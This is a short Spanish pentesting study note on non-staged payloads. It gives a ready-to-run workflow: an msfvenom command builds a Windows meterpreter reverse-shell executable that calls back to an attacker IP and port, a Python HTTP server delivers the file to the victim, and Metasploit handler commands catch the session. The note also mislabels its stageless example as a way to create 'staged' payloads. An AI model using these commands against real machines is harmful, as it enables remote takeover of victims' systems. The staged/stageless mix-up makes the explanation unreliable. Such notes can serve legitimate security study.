#payload #explotacion 

-------
Los de este tipo envían el payload de forma directa, mientras que los de tipo [[Staged]] no lo hacen.

- Es mucho más grande
- Código directo y necesario
- Más rápido de enviar

Una forma de crear payloads **staged** es de la siguiente manera, usando el [[MsfVenom]] con el siguiente código de ejecución:

```bash
msfvenom -p windows/meterpreter_reverse_tcp --platform windows -a x64 LHOST=192.168.20.16 LPORT=4646 -f exe -o reverse.exe
```

Posteriormente, una vez ganado el acceso en la máquina víctima, con el siguiente comando abre un servidor en Python3 y descarga el virus en la máquina víctima:

```bash
python3 -m http.server 80 
```

Una vez descargado, mediante Metasploit accede a la consola operativa del payload con los siguientes comandos:


```bash
msfconsole 
```

```bash 
msfdb run 
```

Luego, una vez estando en la consola, realiza lo siguiente:

```metaexploit 
use exploit/multi/handler
```

Seteamos el payload que vamos a utilizar:

```metaexploit
set payload windows/x64/meterpreter_reverse_tcp 
```

Seteamos nuestra IP y puerto de atacante:

```metaexploit
set LHOST 192.168.20.16
```

```metaexploit
set LPORT 4646
```

Y posteriormente, simplemente lo ejecutamos con el comando **run**.
